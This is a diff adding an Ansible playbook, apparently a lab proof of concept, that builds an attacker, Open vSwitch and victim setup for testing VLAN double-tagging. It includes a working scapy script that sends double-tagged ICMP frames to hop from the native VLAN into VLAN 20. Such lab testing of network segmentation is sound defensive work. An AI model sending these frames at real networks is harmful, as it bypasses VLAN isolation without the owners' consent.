@@ -1,0 +1,69 @@
+---
+# N5b PoC — sets up the double-tagging test automatically.
+# attacker (.10)  = sends the test frame
+# switchvm (.2)   = OVS switch in the middle
+# victim   (.20)  = listens on VLAN 20
+
+- name: Attacker setup
+  hosts: attacker
+  become: true
+  tasks:
+    - name: Install scapy + tcpdump
+      ansible.builtin.apt:
+        name:
+          - python3-scapy
+          - tcpdump
+        state: present
+        update_cache: true
+
+    - name: Drop the double-tag test script
+      ansible.builtin.copy:
+        dest: /root/dtag.py
+        mode: '0755'
+        content: |
+          # Sends a double-tagged frame: outer VLAN 10 (native), inner VLAN 20 (victim).
+          # Run with:  sudo python3 /root/dtag.py
+          from scapy.all import Ether, Dot1Q, IP, ICMP, sendp
+          IFACE = "ens3"   # change if 'ip a' shows a different interface name
+          frame = (
+              Ether(dst="ff:ff:ff:ff:ff:ff") /
+              Dot1Q(vlan=10) /
+              Dot1Q(vlan=20) /
+              IP(dst="10.20.20.20") /
+              ICMP()
+          )
+          sendp(frame, iface=IFACE, count=5, inter=0.5, verbose=True)
+
+
+- name: Switch setup (OVS)
+  hosts: switchvm
+  become: true
+  tasks:
+    - name: Install Open vSwitch
+      ansible.builtin.apt:
+        name: openvswitch-switch
+        state: present
+        update_cache: true
+
+    - name: Create OVS bridge br0
+      ansible.builtin.command:
+        cmd: ovs-vsctl --may-exist add-br br0
+      changed_when: false
+
+
+- name: Victim setup
+  hosts: victim
+  become: true
+  tasks:
+    - name: Install tcpdump
+      ansible.builtin.apt:
+        name: tcpdump
+        state: present
+        update_cache: true
+
+    - name: Create the VLAN 20 listener interface
+      ansible.builtin.shell: |
+        ip link add link ens3 name ens3.20 type vlan id 20 || true
+        ip addr add 10.20.20.20/24 dev ens3.20 || true
+        ip link set ens3.20 up
+      changed_when: false
